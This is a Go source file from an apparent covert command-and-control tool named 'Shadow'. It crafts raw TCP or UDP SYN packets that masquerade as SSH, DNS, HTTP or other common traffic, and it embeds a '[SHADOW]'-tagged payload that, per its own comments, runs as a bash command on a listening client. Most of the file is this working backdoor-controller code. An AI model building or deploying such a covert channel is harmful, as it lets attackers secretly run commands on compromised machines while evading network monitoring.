package shadow

import (
	"log"
	"math/rand"
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

// long term storage
var SrcIP net.IP

// Returns the common port via IANA for a given layer 7 protocol, or a random port in the range 10000 -> 550000
func layer7Protocol(protocol string) (port int) {
	switch protocol {
	case "SSH":
		port = 22
	case "TELNET":
		port = 23
	case "NTP":
		port = 37
	case "DNS":
		port = 53
	case "HTTP":
		port = 80
	case "HTTPS":
		port = 443
	default:
		port = rand.Intn(45000) + 10000
	}
	return
}

// CreatePacket creates a packet with either relevant layer 4 protocol masquerading as some layer 7
// protocol designed for interacting with Shadow raw socket clients
//
//   - DstIP: The IP address of your target client.
//   - l4Proto: Either 'TCP' or 'UDP', and will use that as the layer 4 protocol.
//   - l7Proto: Common names for layer 7 protocols, will default to a random int between 10000 and 55000.
//   - data: This will be run as a bash command on the client if the packet successfully transmits
func CreatePacket(DstIP net.IP, l4Proto string, l7Proto string, data string) (packetData []byte) {
	// Check for Outbound IP address
	if SrcIP == nil {
		getOutboundIP()
	}

	// Create buffer and payload data
	buf := gopacket.NewSerializeBuffer()
	srcPort := rand.Intn(45000) + 10000
	dstPort := layer7Protocol(l7Proto)
	prefixedData := "[SHADOW]" + data
	payload := gopacket.Payload([]byte(prefixedData))

	// Layer 3 and Layer 4 config and options
	opts := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	// Create either the TCP or UDP data
	switch l4Proto {
	case "TCP":
		ip := &layers.IPv4{
			Version:  4,
			IHL:      5,
			TTL:      64,
			Protocol: layers.IPProtocolTCP,
			SrcIP:    SrcIP,
			DstIP:    DstIP,
		}
		TCPData := &layers.TCP{
			SrcPort: layers.TCPPort(srcPort),
			DstPort: layers.TCPPort(dstPort),
			SYN:     true,
			Seq:     rand.Uint32(),
			Window:  65535,
		}
		TCPData.SetNetworkLayerForChecksum(ip)
		err := gopacket.SerializeLayers(buf, opts, ip, TCPData, payload)
		if err != nil {
			log.Fatal(err)
		}
	case "UDP":
		ip := &layers.IPv4{
			Version:  4,
			IHL:      5,
			TTL:      64,
			Protocol: layers.IPProtocolUDP,
			SrcIP:    SrcIP,
			DstIP:    DstIP,
		}
		UDPData := &layers.UDP{
			SrcPort: layers.UDPPort(srcPort),
			DstPort: layers.UDPPort(dstPort),
		}
		UDPData.SetNetworkLayerForChecksum(ip)
		err := gopacket.SerializeLayers(buf, opts, ip, UDPData, payload)
		if err != nil {
			log.Fatal(err)
		}
	default:
		log.Panicf("Unsupported layer 4 protocol: %s", l4Proto)
	}

	return buf.Bytes()
}
